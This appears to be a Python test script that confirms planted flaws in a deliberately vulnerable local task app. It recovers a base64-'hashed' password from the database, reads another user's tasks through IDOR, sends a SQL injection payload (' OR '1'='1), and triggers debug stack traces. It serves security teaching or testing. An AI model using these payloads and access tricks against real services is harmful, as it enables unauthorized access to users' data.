import requests
import sqlite3
import base64
import time
import subprocess
import sys
import os

BASE_URL = "http://127.0.0.1:5000"

def log(message, status="INFO"):
    colors = {
        "INFO": "\033[94m",
        "SUCCESS": "\033[92m",
        "FAIL": "\033[91m",
        "RESET": "\033[0m"
    }
    print(f"{colors.get(status, '')}[{status}] {message}{colors['RESET']}")

def test_m10_weak_crypto():
    log("Testing M10: Insufficient Cryptography (Weak Hashing)...")
    conn = sqlite3.connect('planitbroken.db')
    cursor = conn.cursor()
    cursor.execute("SELECT username, password FROM users WHERE username='victim'")
    user = cursor.fetchone()
    conn.close()
    
    if not user:
        log("Victim user not found in DB. Skipping M10 check.", "FAIL")
        return

    stored_pw = user[1]
    decoded = base64.b64decode(stored_pw).decode()
    
    if decoded == "secret123":
        log(f"SUCCESS: Recovered password '{decoded}' from DB. (Base64 used)", "SUCCESS")
    else:
        log("FAIL: Password encryption seems robust enough.", "FAIL")

def test_m3_idor():
    log("Testing M3: Insecure Authorization (IDOR)...")
    # Attacker (ID 2) tries to access Victim (ID 1) data
    response = requests.get(f"{BASE_URL}/tasks?user_id=1")
    
    if response.status_code == 200 and "Buy Milk" in response.text:
        log("SUCCESS: Attacker viewed Victim's tasks via IDOR.", "SUCCESS")
    else:
        log(f"FAIL: IDOR failed. Status: {response.status_code}", "FAIL")

def test_m4_sqli():
    log("Testing M4: Insufficient Input Validation (SQL Injection)...")
    # Payload to dump all tasks regardless of filter
    payload = "' OR '1'='1" 
    response = requests.get(f"{BASE_URL}/tasks/search?q={payload}")
    
    if response.status_code == 200 and len(response.json()) > 0:
        log(f"SUCCESS: SQL Injection worked. Returned {len(response.json())} items.", "SUCCESS")
    else:
        log("FAIL: SQL Injection did not return extra data.", "FAIL")

def test_m8_misconfig():
    log("Testing M8: Security Misconfiguration (Debug Mode)...")
    # Trigger an error (invalid SQL via syntax error injection)
    payload = "'"
    response = requests.get(f"{BASE_URL}/tasks/search?q={payload}")
    
    if response.status_code == 500 and "Traceback" in response.text:
        log("SUCCESS: Server returned stack trace (Debug Mode active).", "SUCCESS")
    else:
        log("FAIL: No stack trace found.", "FAIL")

def setup_data():
    # Register Victim
    requests.post(f"{BASE_URL}/register", json={"username": "victim", "password": "secret123"})
    # Login Victim to get ID (assuming 1 for fresh DB)
    
    # Add Task for Victim
    requests.post(f"{BASE_URL}/tasks", json={"user_id": 1, "title": "Buy Milk", "description": "For cereal"})
    
    # Register Attacker
    requests.post(f"{BASE_URL}/register", json={"username": "attacker", "password": "password"})

if __name__ == "__main__":
    # Wait for server to start
    log("Waiting for server to ensure it is up...", "INFO")
    time.sleep(2)
    
    try:
        setup_data()
        test_m10_weak_crypto()
        test_m3_idor()
        test_m4_sqli()
        test_m8_misconfig()
    except Exception as e:
        log(f"Test Suite Error: {e}", "FAIL")
